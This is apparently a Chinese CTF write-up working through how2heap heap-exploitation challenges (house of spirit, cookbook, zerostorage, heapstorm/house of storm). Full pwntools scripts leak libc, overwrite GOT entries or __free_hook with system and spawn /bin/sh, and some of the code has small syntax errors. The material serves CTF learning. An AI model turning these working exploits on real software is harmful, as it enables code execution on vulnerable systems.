<p>Leave a Message with your Order:<br>在bss段一个128字节的空间里写入消息。</p>
<p>Show current stats:<br>    显示所有rifles 和 orders 个数 ，显示notice .</p>
<p>这一题我们只能在malloc的时候写入，并且只能一次性free所有申请过的chunk，这让我们很难利用堆溢出构造重叠，因为我们几乎无法控制size部分，也没有写入free的堆块的手段。<br>但是一次性free所有指针+fd可以被控制，这可以让我们free任意地址，而notice存在指针。我们控制notice的指针，对后续必然非常有帮助，于是可以想到house of spirit<br>为了控制指针，我们需要利用到指针前面的totalrifles(记录rifles总数，之前说过的) ，这可以帮助我们构造出size部分。 然后我们控制了指针就可以进行任意写了。<br>但是我们还需要泄露libc地址，这也并不是很复杂，因为我们可以输出chunk中的内容，如果控制指针指向got表，即可输出got表中内容，进而获取libc地址<br>任意指的指针只能用一次，我们用它修改got内容，需要找到一个合适的调用位置，这里我是没注意到的，在readnum中有个位置可以正好让我们写入&#x2F;bin&#x2F;sh,并且马上可以作为函数的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    _fgets</span><br><span class="line">lea     eax, [ebp+var_30]</span><br><span class="line">mov     [esp+8], eax</span><br><span class="line">mov     dword ptr [esp+4], offset aU ; &quot;%u&quot;</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_sscanf</span><br></pre></td></tr></table></figure>

<p>综合上述逻辑，就可以开始写脚本了。</p>
<p>先写对应的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def new(ptr):</span><br><span class="line">        p.send(b&#x27;1\n&#x27;)</span><br><span class="line">        p.sendline(b&#x27;a&#x27;*(52-25)+ptr)</span><br><span class="line">        p.sendline(b&#x27;abcd&#x27;)</span><br><span class="line">def show(i):</span><br><span class="line">#从0开始，显示第i个的内容</span><br><span class="line">        p.sendline(b&#x27;2&#x27;)</span><br><span class="line">        for _ in range(i+1):</span><br><span class="line">                p.recvuntil(b&#x27;Description: &#x27;)</span><br><span class="line">        return p.recvline().rstrip(b&#x27;\n&#x27;)</span><br><span class="line">def order():</span><br><span class="line">#free所有</span><br><span class="line">        p.sendline(b&#x27;3&#x27;)</span><br><span class="line">def message(data):</span><br><span class="line">        p.sendline(b&#x27;4&#x27;)</span><br><span class="line">        p.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再泄露libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#泄露libc</span></span><br><span class="line">new(p32(<span class="number">0x0804A248</span>))</span><br><span class="line">puts = <span class="built_in">int</span>.from_bytes(show(<span class="number">1</span>)[:<span class="number">4</span>],<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">puts_offset=<span class="number">0x0005fcb0</span></span><br><span class="line">libc_base = puts-puts_offset</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>house_of_spirit </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#house_of_spirit</span></span><br><span class="line"><span class="comment">#申请0x3f个枪支 ，伪造size，先0x3e个，最后一个要覆写</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3e</span>):</span><br><span class="line">        new(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">new(payload)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">22</span>) + p32(<span class="number">0x51</span>)</span><br><span class="line">message(payload)</span><br><span class="line">order()</span><br><span class="line">sscanf_got = <span class="number">0x0804A258</span></span><br><span class="line">p.send(<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(p32(sscanf_got))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这时候我们已经控制了指针，并且已经把指针调到了got</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#覆盖got表 获得shell</span></span><br><span class="line">message(p32(system_offset+libc_base))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>之后两题在原始的技术方面都挺简单，但是后面会跟着其他的比较难的技术，于是我直接跳过了</em></p>
<h2 id="cookbook"><a href="#cookbook" class="headerlink" title="cookbook"></a>cookbook</h2><p>这题的复杂程度简直离谱，我直接找了个writeup看，how2heap例题多少有点抽象。<br>涉及到的一些结构:<br>recipe:<br>0x0:  ptr to linked list of ingredient counts<br>0x4:  ptr to linked list of ingredient quantities<br>0x8:  char array for recipe name<br>124:  char array to recipe type<br>140:  Char array for recipe instruction</p>
<p>ingredient:<br>0x0: calories<br>0x4: price<br>0x8: char array for ingredient name<br>0x140: ptr to itself </p>
<p>主程序是一个菜单，涉及三部分的操作，由于太复杂就不细说了，<br>漏洞出现在create recipe里，discard recipe功能有UAF漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">    <span class="built_in">free</span>(dword_804D0A0);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>

<p>dword_804D0A0是一个指向当前正在操作的recipe的指针，其他的操作都需要用到这个指针，同样还有指向当前在操作的ingredient的指针<br>利用这个漏洞，再加上两个结构存储的数据，我们可以获取堆内存，先创建一个新的recipe free掉，输出recipe的时候就会输出heap地址。</p>
<p>然后就是泄露libc.很明显recipe的instruction是溢出的，那么我们就可以通过uaf漏洞，来覆盖之后链表中指向最新ingredient的指针，再输出这个ingredient信息，泄露libc,<br>我们可以利用之前已经free的recipe，先新建 ingredient 然后把他导入链表，然后再编辑recipe进行溢出，然后再输出ingredient信息即可。</p>
<p>然后就是利用house_of_force覆盖 free_hook 这里可以利用name自定义大小的功能。</p>
<p>脚本方面，这里操作太多了，写成很多函数的形式感觉并不容易，可以直接写输入输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x804d018</span></span><br><span class="line">free_hook_offset = <span class="number">0x1b8b10</span></span><br><span class="line">free_offset = <span class="number">0x73880</span></span><br><span class="line">p = process(<span class="string">&#x27;./cookbook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;jimijingshen&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">refresh_heap</span>(<span class="params">index</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,index):</span><br><span class="line">                p.sendline(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">                p.sendline(<span class="built_in">hex</span>(<span class="number">5</span>).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">                p.sendline(<span class="string">&quot;abcd&quot;</span>)</span><br><span class="line">                sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recvs</span>():</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;====================&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recve</span>():</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;[q]uit&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recvd</span>():</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;------\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_heap</span>():</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;water&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;0x3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;p&#x27;</span>)</span><br><span class="line"><span class="comment">#这里注意要添加一个成分，不然recipe的堆不能进入unsortedbin 而是和topchunk合并</span></span><br><span class="line">        p.recvuntil(<span class="string">b&quot;recipe type: (null)\n\n&quot;</span>)</span><br><span class="line">        leak = p.recvuntil(<span class="string">b&#x27;-&#x27;</span>).decode(<span class="string">&#x27;l1&#x27;</span>).rstrip(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        leak = <span class="built_in">int</span>(leak)</span><br><span class="line">                p.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> leak-<span class="number">0x430</span></span><br><span class="line"><span class="comment">#返回的是leak_heap操作的recipe的地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">ptr</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;g&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;jimijingshen&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;p&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;0&#x27;</span>*<span class="number">12</span> + p32(free_got) + p32(<span class="number">0</span>))</span><br><span class="line">        p.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;l&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                recvd()</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;calories: &#x27;</span>)</span><br><span class="line">        x=ctypes.c_uint32(<span class="built_in">int</span>(p.recvline().decode(<span class="string">&#x27;l1&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> x.value - free_offset</span><br><span class="line">ptr = leak_heap()</span><br><span class="line">libc_addr = leak_libc(ptr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ptr))</span><br><span class="line">system = libc_addr + <span class="number">0x3b160</span></span><br><span class="line">free_hook = libc_addr + free_hook_offset</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house</span>():</span><br><span class="line">        refresh_heap(<span class="number">0x100</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">                recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;i&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;abcd&#x27;</span>+p32(<span class="number">0</span>)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#这里pwndbg的heap是找不到位置的 可以输入特定字符然后用搜索功能</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        recve()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        recve()</span><br><span class="line">house()</span><br><span class="line">wild = ptr+<span class="number">0x92c9410</span>-<span class="number">0x92c82a8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overwrite</span>():</span><br><span class="line">        malloc_to_freehook = (free_hook-<span class="number">16</span>) - wild</span><br><span class="line"><span class="comment">#只需要减去一个16,因为是32位。</span></span><br><span class="line">        p.sendline(<span class="string">b&#x27;g&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">hex</span>(malloc_to_freehook))</span><br><span class="line">        p.sendline(<span class="string">b&#x27;0000&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;g&#x27;</span>)s</span><br><span class="line">        p.sendline(<span class="built_in">hex</span>(<span class="number">5</span>))</span><br><span class="line">        p.sendline(p32(system))</span><br><span class="line">        p.sendline(<span class="string">b&#x27;g&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">hex</span>(<span class="number">8</span>))</span><br><span class="line">        p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;R&#x27;</span>)</span><br><span class="line"></span><br><span class="line">overwrite()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="zerostorage"><a href="#zerostorage" class="headerlink" title="zerostorage"></a>zerostorage</h2><p>这题漏洞的位置非常新颖。<br>后面的利用how2heap没怎么讲。</p>
<p>先讲一下每个部分的功能。<br>1: 申请并写入内容，最大不会超过0x1000 , 最小申请的大小是0x80 ，但是在记录的时候按输入大小计算<br>2: realloc 对某个序号对应的chunk realloc。其他和申请差不多。<br>3: merge 合并，输入第一个数是from 第二个是to  from 的内容会接到to后面。如果两者记录的大小之和小于0x80会用沿用原来的chunk 但是序号会是新的。<br>4: 删除entry<br>5: 输出内容<br>6: 列出所有正在使用的chunk的大小。</p>
<p>漏洞在merge 部分，没有检测输入的两个序号是不是相同的，导致uaf漏洞。</p>
<p>后面的利用方式也是比较新，利用unlink把一个大数写入global_max_fast ，这样就能打fastbin dup，解决了unsorted bin 被打乱的问题。找到一个除了控制指针之外的新解法。</p>
<p>先写功能  我们要用到的 有12345</p>
<p>总体思路上就是先创建0 ,1 ,2 ,3 ,4<br>0：free一个chunk，用来泄露堆地址<br>1：写入binsh<br>2：unsortedbin attack<br>3：fastbindup<br>4：用来申请合适的size，便于fastbin dup控制指针</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">size,data = <span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">        data = data.ljust(size,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Enter your data:&#x27;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index,size,data=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">a,b</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(b).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Entry No.&#x27;</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="keyword">return</span> p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insert(<span class="number">8</span>)</span><br><span class="line">insert(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">insert(<span class="number">8</span>)</span><br><span class="line">insert(<span class="number">8</span>)</span><br><span class="line">insert(<span class="number">0x90</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">merge(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#0,1,3,4</span></span><br><span class="line">retdata=view(<span class="number">0</span>)</span><br><span class="line">unsortedbin_0 = u64(retdata[:<span class="number">8</span>])</span><br><span class="line">main_arena = u64(retdata[<span class="number">8</span>:])</span><br><span class="line">libc_addr = main_arena-( <span class="number">0x7b3361fbf7b8</span>-<span class="number">0x7b3361c00000</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里已经完成了泄露，如果我们把0update一下，bk位置填入global_max_fast - 0x10就能篡改它的值<br>但是后面就没法继续写了，因为内核的更新，通过libc算text就不行了。</p>
<h2 id="heapstorm"><a href="#heapstorm" class="headerlink" title="heapstorm"></a>heapstorm</h2><p>沟槽的how2heap又挂羊头卖狗肉，这题说是largebin attack 没错，但其实主要是house_of_storm</p>
<p> 这次四个功能都特别简单，要注意的是:<br>禁止了fastbin<br>用的alloc申请。<br>这题的漏洞是一个off-by-null 用这个漏洞可以实现overlap 然后我们要想的是怎么弄出largebin的重叠部分，还有怎么进行house_of_storm</p>
<p>复习一下构造重叠的操作:<br>alloc(0x18)   0<br>alloc(0x508)   1<br>alloc(0x18)   2<br>这时候要在第二个chunk 0x4f0的位置构造prev_size<br>free 1<br>然后利用off-one-byte 覆盖使得chunk1缩小<br>然后在中间申请一个chunk 再free 2 就重叠了.</p>
<p>后面的house of storm大致如下:<br>构造第二个如上的覆盖。<br>然后利用unsorted bin 的切割 构造出两个unsorted bin  并且使得其中进入large bin(利用整理机制 )<br>一个largebin 用来通过偏移的方式写入一个size ，同时覆盖出合理bk<br>然后用unsortedbin attack 获得获取对应的chunk<br>后面就是利用合理的覆盖满足view功能的限定条件泄露libc 同时覆盖__free_hook</p>
<p>先写一些利用函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Allocate</span>(<span class="params">size</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Update</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">View</span>(<span class="params">index</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">        data=p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<p>先提前申请好六个chunk用来构造重叠</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocate(0x18)      #0</span><br><span class="line">Allocate(0x508)      #1</span><br><span class="line">Allocate(0x18)      #2</span><br><span class="line">Update(1, b&#x27;h&#x27;*0x4f0+p64(0x500))</span><br><span class="line"></span><br><span class="line">Allocate(0x18)    #3</span><br><span class="line">Allocate(0x508)   #4</span><br><span class="line">Allocate(0x18)    #5</span><br><span class="line">Update(4, b&#x27;a&#x27;*0x4f0+p64(0x500))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60fd9cc16000</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60fd9cc16020</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60fd9cc16530</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60fd9cc16550</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60fd9cc16570</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60fd9cc16a80</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构造第一个重叠</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Allocate(<span class="number">0x18</span>)   <span class="comment">#6</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Update(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">Allocate(<span class="number">0x18</span>)  <span class="comment">#1</span></span><br><span class="line">Allocate(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Allocate(<span class="number">0x38</span>) <span class="comment">#1</span></span><br><span class="line">Allocate(<span class="number">0x4e8</span>)   <span class="comment">#2</span></span><br><span class="line"><span class="comment">#01234567</span></span><br></pre></td></tr></table></figure>

<p>接下来构造第二个重叠的时候，要求最大的那个unsorted bin 大小比第一个略小,这样才能把他它放进largebin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">4</span>)</span><br><span class="line">Update(<span class="number">3</span>,<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">Allocate(<span class="number">0x18</span>) <span class="comment">#4</span></span><br><span class="line">Allocate(<span class="number">0x4d8</span>) <span class="comment">#8</span></span><br><span class="line">Delete(<span class="number">4</span>)</span><br><span class="line">Delete(<span class="number">5</span>)</span><br><span class="line">Allocate(<span class="number">0x48</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#01234678</span></span><br></pre></td></tr></table></figure>

<p>由于先进先出 这里不申请 把2free了，然后再申请 才会整理到后面那个位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Allocate(<span class="number">0x4e8</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>然后就是利用覆盖伪造bk 和bk_nextsize  先largebin attack 然后分配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">        storage = <span class="number">0x13370800</span></span><br><span class="line">        fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line">        <span class="comment"># 覆盖largebin</span></span><br><span class="line">        p2 = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)+p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)+p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">        Update(<span class="number">8</span>,p2)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 覆盖unsortedbin</span></span><br><span class="line">        p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk)</span><br><span class="line">        Update(<span class="number">7</span>,p1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#如果heap分配到了0x56开头,就可以成功分配到指定位置</span></span><br><span class="line">        Allocate(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> p.poll()==<span class="literal">None</span> :</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                p=process(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line"><span class="comment"># 已经分配到目标位置</span></span><br><span class="line"><span class="comment">#接下来要求满足view功能的条件</span></span><br><span class="line">storage = <span class="number">0x13370800</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x13377331</span>) + p64(storage)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">Update(<span class="number">2</span>,payload)</span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(storage-<span class="number">0x20</span>+<span class="number">3</span>)+p64(<span class="number">8</span>))</span><br><span class="line">Update(<span class="number">0</span>,payload)</span><br><span class="line">heap = u64(View(<span class="number">1</span>))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>)+p64(heap+<span class="number">0x10</span>)+p64(<span class="number">8</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">Update(<span class="number">0</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">libc_addr = u64(View(<span class="number">1</span>))-<span class="number">0x7ce1c09c1b58</span>+<span class="number">0x7ce1c0600000</span></span><br><span class="line"><span class="comment">#print(libc_addr)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span 